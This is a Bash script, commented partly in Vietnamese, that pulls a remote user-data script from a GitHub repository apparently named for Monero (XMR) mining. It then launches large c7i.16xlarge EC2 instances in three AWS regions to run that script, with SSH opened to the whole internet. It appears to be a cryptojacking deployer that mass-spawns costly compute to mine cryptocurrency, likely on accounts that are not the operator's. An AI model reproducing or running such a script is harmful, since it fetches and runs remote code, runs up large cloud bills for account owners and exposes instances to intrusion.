#!/bin/bash

# List of regions and corresponding AMI IDs
declare -A region_image_map=(
    ["us-east-1"]="ami-0e2c8caa4b6378d8c"
    ["us-west-2"]="ami-05d38da78ce859165"
    ["eu-north-1"]="ami-075449515af5df0d1"
)

# URL chứa User Data trên GitHub
user_data_url="https://raw.githubusercontent.com/hoanglonglouis/AnhThin-XMR/main/AnhThinXmr"

# Đường dẫn file User Data
user_data_file="/tmp/user_data.sh"

# Tải User Data từ GitHub
echo "Downloading user-data from GitHub..."
curl -s -L "$user_data_url" -o "$user_data_file"

# Kiểm tra xem tệp có tồn tại và không rỗng
if [ ! -s "$user_data_file" ]; then
    echo "Error: Failed to download user-data from GitHub."
    exit 1
fi

# Mã hóa User Data sang base64 để dùng trong AWS
user_data_base64=$(base64 -w 0 "$user_data_file")

# Iterate over each region
for region in "${!region_image_map[@]}"; do
    echo "Processing region: $region"

    # Get the image ID for the region
    image_id=${region_image_map[$region]}

    # Check if Key Pair exists
    key_name="GodLong-$region"
    if aws ec2 describe-key-pairs --key-names "$key_name" --region "$region" > /dev/null 2>&1; then
        echo "Key Pair $key_name already exists in $region"
    else
        aws ec2 create-key-pair \
            --key-name "$key_name" \
            --region "$region" \
            --query "KeyMaterial" \
            --output text > "${key_name}.pem"
        chmod 400 "${key_name}.pem"
        echo "Key Pair $key_name created in $region"
    fi

    # Check if Security Group exists
    sg_name="Random-$region"
    sg_id=$(aws ec2 describe-security-groups --group-names "$sg_name" --region "$region" --query "SecurityGroups[0].GroupId" --output text 2>/dev/null)

    if [ -z "$sg_id" ]; then
        sg_id=$(aws ec2 create-security-group \
            --group-name "$sg_name" \
            --description "Security group for $region" \
            --region "$region" \
            --query "GroupId" \
            --output text)
        echo "Security Group $sg_name created with ID $sg_id in $region"
    else
        echo "Security Group $sg_name already exists with ID $sg_id in $region"
    fi

    # Ensure SSH (22) port is open
    if ! aws ec2 describe-security-group-rules --region "$region" --filters Name=group-id,Values="$sg_id" Name=ip-permission.from-port,Values=22 Name=ip-permission.to-port,Values=22 Name=ip-permission.cidr,Values=0.0.0.0/0 > /dev/null 2>&1; then
        aws ec2 authorize-security-group-ingress \
            --group-id "$sg_id" \
            --protocol tcp \
            --port 22 \
            --cidr 0.0.0.0/0 \
            --region "$region"
        echo "SSH (22) access enabled for Security Group $sg_name in $region"
    else
        echo "SSH (22) access already configured for Security Group $sg_name in $region"
    fi

    # Launch 1 On-Demand EC2 Instance
    instance_id=$(aws ec2 run-instances \
        --image-id "$image_id" \
        --count 1 \
        --instance-type c7i.16xlarge \
        --key-name "$key_name" \
        --security-group-ids "$sg_id" \
        --user-data "$user_data_base64" \
        --region "$region" \
        --query "Instances[0].InstanceId" \
        --output text)

    echo "On-Demand Instance $instance_id created in $region using Key Pair $key_name and Security Group $sg_name"

done
